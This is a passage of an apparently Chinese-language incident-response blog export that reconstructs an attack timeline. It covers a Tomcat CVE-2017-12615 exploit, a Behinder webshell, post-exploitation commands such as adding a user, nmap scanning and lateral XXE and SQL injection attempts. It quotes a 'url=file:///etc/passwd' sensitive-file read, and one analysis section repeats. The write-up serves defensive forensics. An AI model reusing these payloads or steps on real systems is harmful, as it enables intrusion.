分析攻击ip：10.110.230.239&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-07-11 14:06:13 发现受害机器 10.95.209.15 （8080web应用尝试漏洞利用） 2024-07-11 14:06:13-—–14:33:36尝试利用接口POST &#x2F;ureport&#x2F;designer&#x2F;saveReportFile发现其c2 ip： 101.201.209.38:81 尝试远程命令执行目录穿越 失败 2024-07-11 14:34:51–2024-07-11 14:36:38攻击者尝试10.95.209.15:81利用nginx 配置不当&#x2F;tp5&#x2F;thinkphp&#x2F;&#x2F;tp5&#x2F;敏感目录泄露 2024-07-11 14:43:42—2024-07-11 14:44:01攻击者尝试10.95.209.15:82利用nginx 配置不当&#x2F;tp5&#x2F;thinkphp&#x2F;&#x2F;tp5&#x2F;敏感目录泄露 2024-07-16 10:47:56 发现受害机器 10.95.209.1532024-07-16 10:47:56-———–8080web应用尝试弱口令利用 失败 2024-07-16 14:50:05 ———-10.95.209.153:82尝试命令执行post &#x2F;发送 url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 获取敏感文件攻击成功 分析受害ip：10.95.209.77&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-07-16 10:23:18 怀疑攻击者利用受害者ip的en34网卡 192.168.8.130 c段横向攻击 2024-07-16 10:23:18尝试攻击目标主机 ： 192.168.8.254尝试利用接口POST &#x2F;webtools&#x2F;control&#x2F;xmlrpc 实行xxe攻击 失败2024-07-16 10:23:18尝试攻击目标主机： 192.168.8.132:8888尝试利用接口POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node sql注入攻击 失败 发现直到2024-07-16 10:23:38 的20s内 出现多个漏洞的告警事件初步判定攻击者使用漏扫工具扫描c段ip 分析受害ip：10.95.209.15&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-06-24 03:10:12 攻击ip :10.95.58.130 nmap扫描 2024-06-27 06:48:56&amp;2024-06-30 07:52:10 攻击ip: 10.95.58.137 nmap扫描 2024-07-01 07:54:11 攻击ip: 10.95.58.104 nmap扫描 2024-07-02 22:33:57&amp;2024-07-10 22:27:38 攻击ip: 10.95.58.111 2024-07-05 23:23:44nmap 扫描 2024-07-04 22:56:32 攻击ip: 10.95.58.103 nmap 扫描 2024-07-06 22:04:45&amp;2024-07-12 01:34:06 攻击ip: 10.95.58.132 nmap 扫描 2024-07-09 17:43:50—2024-07-09 17:44:08 **攻击ip:**10.95.209.6 漏扫 2024-07-12 01:34:06 攻击ip: 10.95.58.31 nmap 扫描 =&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 总结 10.110.230.239 利用目标10.95.209.77 tomcat 上传漏洞上传冰蝎webshell执行命令并横向 192.168.8.132:8888 和 192.168.8.254 两个目标 尝试漏扫攻击 未果","categories":[null]},{"title":"攻击链梳理","path":"/blog/攻击链梳理/index.html","content":"2024.7.1610:44:41(告警) 发现冰蝎webshell流量告警 攻击ip: 10.110.230.239 受害ip: 10.95.209.77 (tomcat)根据冰蝎特征基本判断是冰蝎webshell上传 2024.7.16 10:08:21 第一次连接webshell 受害ip: 10.95.209.77 2024.7.16 10:08:21—-2024.7.16 10:45:13 之间进行间断的执行命令操作 2024.7.1610:07:42 Tomcat 远程代码执行(CVE-2017-12615)(成功) 受害ip: 10.95.209.77 由漏洞数据包内容特征 并结合后门冰蝎的告警 基本判断是该漏洞导致webshell的上传最早在2024-07-15 10:11:25 攻击者尝试利用漏洞上传webshell2024-07-15 10:13:37攻击者尝试客户端连接 解密数据包 受害ip: 10.95.209.77 由上述漏洞捕捉到的明文数据包 得到密钥md5值根据解密结果得到受害机具有 ens33 和 ens34 双网卡en34ip ：192.168.8.130 （可能存在192.168.8.0&#x2F;24 c段横向）2024-07-15 10:13:37——- 获取系统信息2024-07-15 10:13:43 —— cd &#x2F;opt&#x2F; ;ifconfig2024-07-15 10:13:40 —— whoami2024-07-15 10:25:24——- 获取系统信息2024-07-15 10:25:32——-cd &#x2F;opt&#x2F; ;useradd test 添加test用户2024-07-15 10:28:21——-cd &#x2F;opt&#x2F; ;passwd test 失败 2024-07-16 10:07:42 —– 再次利用漏洞上传webshell2024-07-16 10:08:21——- 尝试连接webshell 成功（未解）2024-07-16 10:18:15—–获取系统信息 分析攻击ip：10.110.230.239&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-07-11 14:06:13 发现受害机器 10.95.209.15 （8080web应用尝试漏洞利用） 2024-07-11 14:06:13-—–14:33:36尝试利用接口POST &#x2F;ureport&#x2F;designer&#x2F;saveReportFile发现其c2 ip： 101.201.209.38:81 尝试远程命令执行目录穿越 失败 2024-07-11 14:34:51–2024-07-11 14:36:38攻击者尝试10.95.209.15:81利用nginx 配置不当&#x2F;tp5&#x2F;thinkphp&#x2F;&#x2F;tp5&#x2F;敏感目录泄露 2024-07-11 14:43:42—2024-07-11 14:44:01攻击者尝试10.95.209.15:82利用nginx 配置不当&#x2F;tp5&#x2F;thinkphp&#x2F;&#x2F;tp5&#x2F;敏感目录泄露 2024-07-16 10:47:56 发现受害机器 10.95.209.1532024-07-16 10:47:56-———–8080web应用尝试弱口令利用 失败 2024-07-16 14:50:05 ———-10.95.209.153:82尝试命令执行post &#x2F;发送 url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 获取敏感文件攻击成功 分析受害ip：10.95.209.77&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-07-16 10:23:18 怀疑攻击者利用受害者ip的en34网卡 192.168.8.130 c段横向攻击 2024-07-16 10:23:18尝试攻击目标主机 ： 192.168.8.254尝试利用接口POST &#x2F;webtools&#x2F;control&#x2F;xmlrpc 实行xxe攻击 失败2024-07-16 10:23:18尝试攻击目标主机： 192.168.8.132:8888尝试利用接口POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node sql注入攻击 失败 发现直到2024-07-16 10:23:38 的20s内 出现多个漏洞的告警事件初步判定攻击者使用漏扫工具扫描c段ip 分析受害ip：10.95.209.15&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-06-24 03:10:12 攻击ip :10.95.58.130 nmap扫描 2024-06-27 06:48:56&amp;2024-06-30 07:52:10 攻击ip: 10.95.58.137 nmap扫描 2024-07-01 07:54:11 攻击ip: 10.95.58.104 nmap扫描 2024-07-02 22:33:57&amp;2024-07-10 22:27:38 攻击ip: 10.95.58.111 2024-07-05 23:23:44nmap 扫描 2024-07-04 22:56:32 攻击ip: 10.95.58.103 nmap 扫描 2024-07-06 22:04:45&amp;2024-07-12 01:34:06 攻击ip: 10.95.58.132 nmap 扫描 2024-07-09 17:43:50—2024-07-09 17:44:08 **攻击ip:**10.95.209.6 漏扫 2024-07-12 01:34:06 攻击ip: 10.95.58.31 nmap 扫描 =&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 总结 10.110.230.239 利用目标10.95.209.77 tomcat 上传漏洞上传冰蝎webshell执行命令并横向 192.168.8.132:8888 和 192.168.8.254 两个目标 尝试漏扫攻击 未果","categories":[null]}]